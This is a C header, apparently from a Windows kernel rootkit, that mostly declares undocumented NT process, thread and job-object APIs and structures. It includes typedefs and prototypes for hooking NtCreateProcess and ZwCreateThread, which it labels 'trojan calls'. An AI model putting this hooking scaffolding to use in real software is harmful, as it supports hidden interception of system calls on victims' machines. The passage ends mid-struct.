
#ifndef __RK_PROCESS_H__
#define __RK_PROCESS_H__

/* some of the process query routines require security structures */

#include "rk_security.h"

/* __________________________________________________
 . types and structs used by process functions
 . __________________________________________________ */

/* _____________________________________________
 . NT Thread manipulation
 . _____________________________________________ */
typedef struct StackInfo_t {
	ULONG Unknown1;
	ULONG Unknown2;
	ULONG TopOfStack;
	ULONG OnePageBelowTopOfStack;
	ULONG BottomOfStack;
} STACKINFO, *PSTACKINFO;


/* __________________________________________________
 . functions prototypes local to process.c
 . __________________________________________________ */


/* __________________________________________________
 . pointer typedefs for hooked calls
 . __________________________________________________ */

typedef NTSTATUS (*NTCREATEPROCESS)(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hParentProcess,
	IN BOOLEAN bInheritParentHandles,
	IN HANDLE hSection OPTIONAL,
	IN HANDLE hDebugPort OPTIONAL,
	IN HANDLE hExceptionPort OPTIONAL
);
extern NTCREATEPROCESS OldNtCreateProcess;

typedef NTSTATUS (*ZWCREATETHREAD) (
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended
);
extern ZWCREATETHREAD OldZwCreateThread;



/* __________________________________________________
 . prototypes for our trojan calls
 . __________________________________________________ */
NTSYSAPI
NTSTATUS
NTAPI NewZwCreateThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended
	);

NTSYSAPI
NTSTATUS
NTAPI NewNtCreateProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hParentProcess,
	IN BOOLEAN bInheritParentHandles,
	IN HANDLE hSection OPTIONAL,
	IN HANDLE hDebugPort OPTIONAL,
	IN HANDLE hExceptionPort OPTIONAL
	);

/* ________________________________________________________________________________
 . prototypes for real calls
 . ________________________________________________________________________________ */

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended
);

NTSTATUS
NTAPI
ZwCreateThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended
);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateThread(
	IN HANDLE hThread,
	IN ULONG ExitCode
);

NTSTATUS
NTAPI
ZwTerminateThread(
	IN HANDLE hThread,
	IN ULONG ExitCode
);

NTSYSAPI
NTSTATUS
NTAPI
NtGetContextThread(
	IN HANDLE hThread,
	IN OUT PCONTEXT pContext
);

NTSTATUS
NTAPI
ZwGetContextThread(
	IN HANDLE hThread,
	IN OUT PCONTEXT pContext
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetContextThread(
	IN HANDLE hThread,
	IN PCONTEXT pContext
);

NTSTATUS
NTAPI
ZwSetContextThread(
	IN HANDLE hThread,
	IN PCONTEXT pContext
);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendThread(
	IN HANDLE hThread,
	OUT PULONG pSuspendCount
);

NTSTATUS
NTAPI
ZwSuspendThread(
	IN HANDLE hThread,
	OUT PULONG pSuspendCount
);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeThread(
	IN HANDLE hThread,
	OUT PULONG pSuspendCount
);

NTSTATUS
NTAPI
ZwResumeThread(
	IN HANDLE hThread,
	OUT PULONG pSuspendCount
);

NTSYSAPI
NTSTATUS
NTAPI
NtTestAlert(
);

NTSYSAPI
NTSTATUS
NTAPI
ZwTestAlert(
);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertThread(
	HANDLE hThread
);

NTSYSAPI
NTSTATUS
NTAPI
ZwAlertThread(
	HANDLE hThread
);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertResumeThread(
	HANDLE hThread,
	OUT PULONG pOldSuspendCount
);

NTSYSAPI
NTSTATUS
NTAPI
ZwAlertResumeThread(
	HANDLE hThread,
	OUT PULONG pOldSuspendCount
);


NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThread(
	IN HANDLE hThread,
	IN PKNORMAL_ROUTINE ApcRoutine,
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
);

NTSTATUS
NTAPI
ZwQueueApcThread(
	IN HANDLE hThread,
	IN PKNORMAL_ROUTINE ApcRoutine,
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
);

NTSYSAPI
NTSTATUS
NTAPI
NtContinue(
	PCONTEXT pNewContext,
	BOOLEAN bTestAlert
);

NTSYSAPI
NTSTATUS
NTAPI
ZwContinue(
	PCONTEXT pNewContext,
	BOOLEAN bTestAlert
);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID pClientId
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID pClientId
);

NTSYSAPI
NTSTATUS
NTAPI
NtYieldExecution(
);

NTSYSAPI
NTSTATUS
NTAPI
ZwYieldExecution(
);


/* _________________________________________________________________________
 . Scheduling
 . _________________________________________________________________________ */
#define JOB_OBJECT_ASSIGN_PROCESS           (0x0001)
#define JOB_OBJECT_SET_ATTRIBUTES           (0x0002)
#define JOB_OBJECT_QUERY                    (0x0004)
#define JOB_OBJECT_TERMINATE                (0x0008)
#define JOB_OBJECT_SET_SECURITY_ATTRIBUTES  (0x0010)
#define JOB_OBJECT_ALL_ACCESS       (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1F )


NTSYSAPI
NTSTATUS
NTAPI
NtCreateJobObject(
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

typedef 
NTSTATUS 
(NTAPI *PFNNTCREATEJOBOBJECT)(	
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);


NTSYSAPI
NTSTATUS
NTAPI
ZwCreateJobObject(
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenJobObject(
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

typedef 
NTSTATUS 
(NTAPI *PFNNTOPENJOBOBJECT)(	
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenJobObject(
	OUT PHANDLE phJob,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
NtAssignProcessToJobObject(
	IN HANDLE hJob,
	IN HANDLE hProcess
);

typedef 
NTSTATUS 
(NTAPI *PFNNTASSIGNPROCESSTOJOBOBJECT)(	
	IN HANDLE hJob,
	IN HANDLE hProcess
);


NTSYSAPI
NTSTATUS
NTAPI
ZwAssignProcessToJobObject(
	IN HANDLE hJob,
	IN HANDLE hProcess
);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateJobObject(
	IN HANDLE hJob,
	IN NTSTATUS ExitCode
);

typedef 
NTSTATUS 
(NTAPI *PFNNTTERMINATEJOBOBJECT)(	
	IN HANDLE hJob,
	IN NTSTATUS ExitCode
);

NTSYSAPI
NTSTATUS
NTAPI
ZwTerminateJobObject(
	IN HANDLE hJob,
	IN NTSTATUS ExitCode
);



typedef enum _JOBOBJECTINFOCLASS {
	JobObjectBasicAccountingInformation = 1,
	JobObjectBasicLimitInformation,
	JobObjectBasicProcessIdList,
	JobObjectBasicUIRestrictions,
	JobObjectSecurityLimitInformation,
	JobObjectEndOfJobTimeInformation,
	JobObjectAssociateCompletionPortInformation,
	JobObjectBasicAndIoAccountingInformation,
	JobObjectExtendedLimitInformation,
	MaxJobObjectInfoClass
} JOBOBJECTINFOCLASS;


typedef struct _JOBOBJECT_BASIC_ACCOUNTING_INFORMATION {
	LARGE_INTEGER TotalUserTime;
	LARGE_INTEGER TotalKernelTime;
	LARGE_INTEGER ThisPeriodTotalUserTime;
	LARGE_INTEGER ThisPeriodTotalKernelTime;
	ULONG TotalPageFaultCount;
	ULONG TotalProcesses;
	ULONG ActiveProcesses;
	ULONG TotalTerminatedProcesses;
} JOBOBJECT_BASIC_ACCOUNTING_INFORMATION, *PJOBOBJECT_BASIC_ACCOUNTING_INFORMATION;

typedef struct _JOBOBJECT_BASIC_LIMIT_INFORMATION {
    LARGE_INTEGER PerProcessUserTimeLimit;
    LARGE_INTEGER PerJobUserTimeLimit;
    ULONG LimitFlags;
    ULONG MinimumWorkingSetSize;
    ULONG MaximumWorkingSetSize;
    ULONG ActiveProcessLimit;
    ULONG Affinity;
    ULONG PriorityClass;
} JOBOBJECT_BASIC_LIMIT_INFORMATION, *PJOBOBJECT_BASIC_LIMIT_INFORMATION;

typedef struct _JOBOBJECT_BASIC_PROCESS_ID_LIST {
    ULONG NumberOfAssignedProcesses;
    ULONG NumberOfProcessIdsInList;
    ULONG ProcessIdList[1];
} JOBOBJECT_BASIC_PROCESS_ID_LIST, *PJOBOBJECT_BASIC_PROCESS_ID_LIST;

typedef struct _JOBOBJECT_BASIC_UI_RESTRICTIONS {
    ULONG UIRestrictionsClass;
} JOBOBJECT_BASIC_UI_RESTRICTIONS, *PJOBOBJECT_BASIC_UI_RESTRICTIONS;

typedef struct _JOBOBJECT_SECURITY_LIMIT_INFORMATION {
    ULONG SecurityLimitFlags ;
    HANDLE JobToken ;
    PTOKEN_GROUPS SidsToDisable ;
    PTOKEN_PRIVILEGES PrivilegesToDelete ;
    PTOKEN_GROUPS RestrictedSids ;
} JOBOBJECT_SECURITY_LIMIT_INFORMATION, *PJOBOBJECT_SECURITY_LIMIT_INFORMATION ;

typedef struct _JOBOBJECT_END_OF_JOB_TIME_INFORMATION {
    ULONG EndOfJobTimeAction;
} JOBOBJECT_END_OF_JOB_TIME_INFORMATION, *PJOBOBJECT_END_OF_JOB_TIME_INFORMATION;

typedef struct _JOBOBJECT_ASSOCIATE_COMPLETION_PORT {
    PVOID CompletionKey;
    HANDLE CompletionPort;
} JOBOBJECT_ASSOCIATE_COMPLETION_PORT, *PJOBOBJECT_ASSOCIATE_COMPLETION_PORT;

typedef struct _JOBOBJECT_BASIC_AND_IO_ACCOUNTING_INFORMATION {
	JOBOBJECT_BASIC_ACCOUNTING_INFORMATION BasicInfo;
	IO_COUNTERS IoInfo;
} JOBOBJECT_BASIC_AND_IO_ACCOUNTING_INFORMATION, *PJOBOBJECT_BASIC_AND_IO_ACCOUNTING_INFORMATION;

typedef struct _JOBOBJECT_EXTENDED_LIMIT_INFORMATION {
    JOBOBJECT_BASIC_LIMIT_INFORMATION BasicLimitInformation;
    IO_COUNTERS IoInfo;
	ULONG ProcessMemoryLimit;
    ULONG JobMemoryLimit;
    ULONG PeakProcessMemoryUsed;
    ULONG PeakJobMemoryUsed;
} JOBOBJECT_EXTENDED_LIMIT_INFORMATION, *PJOBOBJECT_EXTENDED_LIMIT_INFORMATION;

#define JOB_OBJECT_TERMINATE_AT_END_OF_JOB  0
#define JOB_OBJECT_POST_AT_END_OF_JOB       1

//
// Completion Port Messages for job objects
//
// These values are returned via the lpNumberOfBytesTransferred parameter
//

#define JOB_OBJECT_MSG_END_OF_JOB_TIME          1
#define JOB_OBJECT_MSG_END_OF_PROCESS_TIME      2
#define JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT     3
#define JOB_OBJECT_MSG_ACTIVE_PROCESS_ZERO      4
#define JOB_OBJECT_MSG_NEW_PROCESS              6
#define JOB_OBJECT_MSG_EXIT_PROCESS             7
#define JOB_OBJECT_MSG_ABNORMAL_EXIT_PROCESS    8
#define JOB_OBJECT_MSG_PROCESS_MEMORY_LIMIT     9
#define JOB_OBJECT_MSG_JOB_MEMORY_LIMIT         10


//
// Basic Limits
//
#define JOB_OBJECT_LIMIT_WORKINGSET                 0x00000001
#define JOB_OBJECT_LIMIT_PROCESS_TIME               0x00000002
#define JOB_OBJECT_LIMIT_JOB_TIME                   0x00000004
#define JOB_OBJECT_LIMIT_ACTIVE_PROCESS             0x00000008
#define JOB_OBJECT_LIMIT_AFFINITY                   0x00000010
#define JOB_OBJECT_LIMIT_PRIORITY_CLASS             0x00000020
#define JOB_OBJECT_LIMIT_PRESERVE_JOB_TIME          0x00000040
#define JOB_OBJECT_LIMIT_SCHEDULING_CLASS           0x00000080

//
// Extended Limits
//
#define JOB_OBJECT_LIMIT_PROCESS_MEMORY             0x00000100
#define JOB_OBJECT_LIMIT_JOB_MEMORY                 0x00000200
#define JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION 0x00000400
#define JOB_OBJECT_LIMIT_BREAKAWAY_OK               0x00000800
#define JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK        0x00001000

#define JOB_OBJECT_LIMIT_RESERVED1                  0x00002000
#define JOB_OBJECT_LIMIT_RESERVED2                  0x00004000
#define JOB_OBJECT_LIMIT_RESERVED3                  0x00008000
#define JOB_OBJECT_LIMIT_RESERVED4                  0x00010000
#define JOB_OBJECT_LIMIT_RESERVED5                  0x00020000
#define JOB_OBJECT_LIMIT_RESERVED6                  0x00040000


#define JOB_OBJECT_LIMIT_VALID_FLAGS            0x0007ffff

#define JOB_OBJECT_BASIC_LIMIT_VALID_FLAGS      0x000000ff
#define JOB_OBJECT_EXTENDED_LIMIT_VALID_FLAGS   0x00001fff
#define JOB_OBJECT_RESERVED_LIMIT_VALID_FLAGS   0x0007ffff

//
// UI restrictions for jobs
//

#define JOB_OBJECT_UILIMIT_NONE             0x00000000

#define JOB_OBJECT_UILIMIT_HANDLES          0x00000001
#define JOB_OBJECT_UILIMIT_READCLIPBOARD    0x00000002
#define JOB_OBJECT_UILIMIT_WRITECLIPBOARD   0x00000004
#define JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS 0x00000008
#define JOB_OBJECT_UILIMIT_DISPLAYSETTINGS  0x00000010
#define JOB_OBJECT_UILIMIT_GLOBALATOMS      0x00000020
#define JOB_OBJECT_UILIMIT_DESKTOP          0x00000040
#define JOB_OBJECT_UILIMIT_EXITWINDOWS      0x00000080

#define JOB_OBJECT_UILIMIT_ALL              0x000000FF

#define JOB_OBJECT_UI_VALID_FLAGS           0x000000FF

#define JOB_OBJECT_SECURITY_NO_ADMIN            0x00000001
#define JOB_OBJECT_SECURITY_RESTRICTED_TOKEN    0x00000002
#define JOB_OBJECT_SECURITY_ONLY_TOKEN          0x00000004
#define JOB_OBJECT_SECURITY_FILTER_TOKENS       0x00000008




NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationJobObject(
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	OUT PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength,
	OUT PULONG BytesReturned
);

typedef 
NTSTATUS 
(NTAPI *PFNNTQUERYINFORMATIONJOBOBJECT)(	
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	OUT PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength,
	OUT PULONG BytesReturned
);


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationJobObject(
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	OUT PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength,
	OUT PULONG BytesReturned
);


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationJobObject(
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	IN PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength
);

typedef 
NTSTATUS 
(NTAPI *PFNNTSETINFORMATIONJOBOBJECT)(	
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	IN PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength
);


NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationJobObject(
	IN HANDLE hJob,
	IN JOBOBJECTINFOCLASS JobObjectInfoClass,
	IN PVOID JobObjectInfoBuffer,
	IN ULONG JobObjectInfoBufferLength
);

/* ____________________________________________________________________ 
 . Process Control
 . ____________________________________________________________________ */
NTSYSAPI
NTSTATUS
NTAPI
NtCreateProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hParentProcess,
	IN BOOLEAN bInheritParentHandles,
	IN HANDLE hSection OPTIONAL,
	IN HANDLE hDebugPort OPTIONAL,
	IN HANDLE hExceptionPort OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hParentProcess,
	IN BOOLEAN bInheritParentHandles,
	IN HANDLE hSection OPTIONAL,
	IN HANDLE hDebugPort OPTIONAL,
	IN HANDLE hExceptionPort OPTIONAL
);

/*ExitProcess makes two calls to this system service. first time it
passes 0 as the process handle and exitcode and second time, it passes 
current process handle (0xFFFFFFFF) and exitcode.
TerminateProcess makes only one call passing the process handle and 
exit code as the parameter
*/
NTSYSAPI
NTSTATUS
NTAPI
NtTerminateProcess(
	IN HANDLE hProcess,
	IN ULONG ExitCode
);

NTSYSAPI
NTSTATUS
NTAPI
ZwTerminateProcess(
	IN HANDLE hProcess,
	IN ULONG ExitCode
);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID pClientId
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID pClientId
);

typedef enum _NT2000PROCESSINFOCLASS {
    ProcessDeviceMap=MaxProcessInfoClass,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
} NT2000PROCESSINFOCLASS;

/*
Following information classes are valid for NtQueryInformationProcess
	ProcessBasicInformation
    ProcessQuotaLimits
    ProcessIoCounters
    ProcessVmCounters
    ProcessTimes
    ProcessDebugPort
    ProcessLdtInformation
    ProcessDefaultHardErrorMode
    ProcessPooledUsageAndLimits
    ProcessWorkingSetWatch
    ProcessPriorityClass
    ProcessWx86Information
    ProcessHandleCount
    ProcessPriorityBoost
	ProcessDeviceMap
    ProcessSessionInformation
    ProcessWow64Information

Following information classes are valid for NtSetInformationProcess
    ProcessQuotaLimits
    ProcessBasePriority
    ProcessRaisePriority
    ProcessDebugPort
    ProcessExceptionPort
    ProcessAccessToken
    ProcessLdtInformation
    ProcessLdtSize
    ProcessDefaultHardErrorMode
    ProcessIoPortHandlers          
    ProcessWorkingSetWatch
    ProcessUserModeIOPL
    ProcessEnableAlignmentFaultFixup
    ProcessPriorityClass
    ProcessAffinityMask
    ProcessPriorityBoost
    ProcessDeviceMap
    ProcessSessionInformation
    ProcessForegroundInformation
    ProcessWow64Information 
*/


//Undocumented structure layouts returned by various process information classes

//ProcessBasePriority
typedef struct BasePriority_t {
	ULONG BasePriority;
} BASEPRIORITYINFO, *PBASEPRIORITYINFO;

//ProcessRaisePriority
typedef struct RaisePriority_t {
	ULONG RaisePriority;
} RAISEPRIORITYINFO, *PRAISEPRIORITYINFO;

//ProcessDebugPort
typedef struct DebugPort_t {
	HANDLE hDebugPort;
} DEBUGPORTINFO, *PDEBUGPORTINFO;

//ProcessExceptionPort
typedef struct ExceptionPort_t {
	HANDLE hExceptionPort;
} EXCEPTIONPORTINFO, *PEXCEPTIONPORTINFO;


//ProcessLdtInformation
typedef struct _LDT_ENTRY {
	USHORT  LimitLow;
	USHORT  BaseLow;
	union {
		struct {
			UCHAR   BaseMid;
			UCHAR   Flags1;
			UCHAR   Flags2;
			UCHAR   BaseHi;
		} Bytes;
		struct {
			ULONG   BaseMid : 8;
			ULONG   Type : 5;
			ULONG   Dpl : 2;
			ULONG   Pres : 1;
			ULONG   LimitHi : 4;
			ULONG   Sys : 1;
			ULONG   Reserved_0 : 1;
			ULONG   Default_Big : 1;
			ULONG   Granularity : 1;
			ULONG   BaseHi : 8;
		} Bits;
	} HighWord;
} LDT_ENTRY, *PLDT_ENTRY;


#define LDT_TABLE_SIZE  ( 8 * 1024 * sizeof(LDT_ENTRY) )

typedef struct _LDT_INFORMATION {
	ULONG Start;
	ULONG Length;
	LDT_ENTRY LdtEntries[1];
} PROCESS_LDT_INFORMATION, *PPROCESS_LDT_INFORMATION;

//ProcessLdtSize
typedef struct _LDT_SIZE {
	ULONG Length;
} PROCESS_LDT_SIZE, *PPROCESS_LDT_SIZE;

#define SEM_FAILCRITICALERRORS      0x0001
#define SEM_NOGPFAULTERRORBOX       0x0002
#define SEM_NOALIGNMENTFAULTEXCEPT  0x0004
#define SEM_NOOPENFILEERRORBOX      0x8000

//ProcessDefaultHardErrorMode
typedef struct HardErrorMode_t {
	ULONG HardErrorMode;
} HARDERRORMODEINFO, *PHARDERRORMODEINFO;

//ProcessUserModeIOPL
typedef struct Iopl_t {
	ULONG Iopl;
} IOPLINFO, *PIOPLINFO;

//ProcessEnableAlignmentFaultFixup
typedef struct AllignmentFault_t {
	BOOLEAN bEnableAllignmentFaultFixup;
} ALLIGNMENTFAULTFIXUPINFO, *PALLIGNMENTFAULTFIXUPINFO;

#define KRNL_NORMAL_PRIORITY_CLASS       0x02
#define KRNL_IDLE_PRIORITY_CLASS         0x01
#define KRNL_HIGH_PRIORITY_CLASS         0x03
#define KRNL_REALTIME_PRIORITY_CLASS     0x04

//ProcessPriorityClass
typedef struct PriorityClass_t {
	UCHAR Unknown;
	UCHAR PriorityClass;
} PRIORITYCLASSINFO, *PPRIORITYCLASSINFO;

//ProcessWx86Information
typedef struct x86_t {
	ULONG x86Info;
} X86INFO, *PX86INFO;

//ProcessHandleCount
typedef struct HandleCount_t {
	ULONG HandleCount;
} HANDLECOUNTINFO, *PHANDLECOUNTINFO;

//ProcessAffinityMask
typedef struct AffinityMask_t {
	ULONG AffinityMask;
} AFFINITYMASKINFO, *PAFFINITYMASKINFO;

//ProcessPriorityBoost
typedef struct PriorityBoost_t {
	ULONG bPriorityBoostEnabled;
} PRIORITYBOOSTINFO, *PPRIORITYBOOSTINFO;

//ProcessDeviceMap
typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[ 32 ];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

#define DRIVE_UNKNOWN		0
#define DRIVE_NO_ROOT_DIR	1
#define DRIVE_REMOVABLE		2
#define DRIVE_FIXED			3
#define DRIVE_REMOTE		4	
#define DRIVE_CDROM			5
#define DRIVE_RAMDISK		6


//ProcessSessionInformation
typedef struct _PROCESS_SESSION_INFORMATION {
    ULONG SessionId;
} PROCESS_SESSION_INFORMATION, *PPROCESS_SESSION_INFORMATION;



NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
	IN HANDLE hProcess,
	IN PROCESSINFOCLASS ProcessInfoClass,
	OUT PVOID ProcessInfoBuffer,
	IN ULONG ProcessInfoBufferLength,
	OUT PULONG BytesReturned OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationProcess(
	IN HANDLE hProcess,
	IN PROCESSINFOCLASS ProcessInfoClass,
	OUT PVOID ProcessInfoBuffer,
	IN ULONG ProcessInfoBufferLength,
	OUT PULONG BytesReturned OPTIONAL
);


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationProcess(
	IN HANDLE hProcess,
	IN PROCESSINFOCLASS ProcessInfoClass,
	IN PVOID ProcessInfoBuffer,
	IN ULONG ProcessInfoBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationProcess(
	IN HANDLE hProcess,
	IN PROCESSINFOCLASS ProcessInfoClass,
	IN PVOID ProcessInfoBuffer,
	IN ULONG ProcessInfoBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationThread(
	IN HANDLE hThread,
	IN THREADINFOCLASS ThreadInfoClass,
	OUT PVOID ThreadInfoBuffer,
	IN ULONG ThreadInfoBufferLength,
	OUT PULONG BytesReturned OPTIONAL
);


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationThread(
	IN HANDLE hThread,
	IN THREADINFOCLASS ThreadInfoClass,
	OUT PVOID ThreadInfoBuffer,
	IN ULONG ThreadInfoBufferLength,
	OUT PULONG BytesReturned OPTIONAL
);


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationThread(
	IN HANDLE hThread,
	IN THREADINFOCLASS ThreadInfoClass,
	IN PVOID ThreadInfoBuffer,
	IN ULONG ThreadInfoBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationThread(
	IN HANDLE hThread,
	IN THREADINFOCLASS ThreadInfoClass,
	IN PVOID ThreadInfoBuffer,
	IN ULONG ThreadInfoBufferLength
);

/*
Following information classes are valid for NtQueryInformationProcess
	ThreadBasicInformation
	ThreadTimes
	ThreadDescriptorTableEntry
	ThreadQuerySetWin32StartAddress
	ThreadPerformanceCount
	ThreadAmILastThread
	ThreadPriorityBoost
	ThreadIsIoPending


Following information classes are valid for NtSetInformationProcess
	ThreadPriority
	ThreadBasePriority
	ThreadAffinityMask
	ThreadImpersonationToken
	ThreadEnableAlignmentFaultFixup
	ThreadEventPair
	ThreadQuerySetWin32StartAddress
	ThreadZeroTlsCell
	ThreadIdealProcessor
	ThreadPriorityBoost
	ThreadSetTlsArrayAddress
	ThreadHideFromDebugger
*/

//Undocumented structure layouts returned by various process information classes

//ThreadBasicInformation
typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
	ULONG UniqueProcessId;
	ULONG UniqueThreadId;
    KAFFINITY AffinityMask;
    KPRIORITY BasePriority;
	ULONG DiffProcessPriority;
} THREAD_BASIC_INFORMATION;

//ThreadPriority
typedef struct _THREAD_PRIORITY {
	ULONG Priority;
} THREAD_PRIORITY, *PTHREAD_PRIORITY;

//ThreadBasePriority
typedef struct _THREAD_BASE_PRIORITY {
	ULONG IncBasePriority;
} THREAD_BASE_PRIORITY, *PTHREAD_BASE_PRIORITY;

//ThreadAffinityMask
typedef struct ThreadAffinityMask_t {
	ULONG ThreadAffinityMask;
} THREADAFFINITYMASKINFO, *PTHREADAFFINITYMASKINFO;

//ThreadDescriptorTableEntry
typedef struct _DESCRIPTOR_TABLE_ENTRY {
    ULONG Selector;
    LDT_ENTRY Descriptor;
} DESCRIPTOR_TABLE_ENTRY, *PDESCRIPTOR_TABLE_ENTRY;

//ThreadEventPair
typedef struct _EVENT_PAIR {
	HANDLE hEventPair;
} EVENTPAIRINFO, *PEVENTPAIRINFO;

//ThreadQuerySetWin32StartAddress
typedef struct _WIN32_START_ADDRESS {
	PVOID Win32StartAddress;
} WIN32_START_ADDRESS, *PWIN32_START_ADDRESS;

//ThreadZeroTlsCell
typedef struct _ZERO_TLSCELL {
	ULONG TlsIndex;
} ZERO_TLSCELL, *PZERO_TLSCELL;

//ThreadPerformanceCount
typedef struct _PERFORMANCE_COUNTER {
	ULONG Count1;
	ULONG Count2;
} PERFORMANCE_COUNTER_INFO, *PPERFORMANCE_COUNTER_INFO;

//ThreadAmILastThread
typedef struct _AMI_LAST_THREAD {
	ULONG bAmILastThread;
} AMI_LAST_THREADINFO, *PAMI_LAST_THREADINFO;

//ThreadIdealProcessor
typedef struct _IDEAL_PROCESSOR {
	ULONG IdealProcessor;
} IDEAL_PROCESSORINFO, *PIDEAL_PROCESSORINFO;

//ThreadSetTlsArrayAddress
typedef struct _TLS_ARRAY {
	ULONG *pTlsArray;
} TLS_ARRAYINFO, PTLS_ARRAYINFO;

typedef enum _NT2000THREADINFOCLASS {
    ThreadIsIoPending=MaxThreadInfoClass,
	ThreadHideFromDebugger
} NT2000PROCESSINFOCLASS;

//ThreadIsIoPending
typedef struct _IS_IO_PENDING {
	ULONG bIsIOPending;
} IS_IO_PENDINGINFO, PIS_IO_PENDINGINFO;

//ThreadHideFromDebugger
typedef struct _HIDE_FROM_DEBUGGER {
	ULONG bHideFromDebugger;
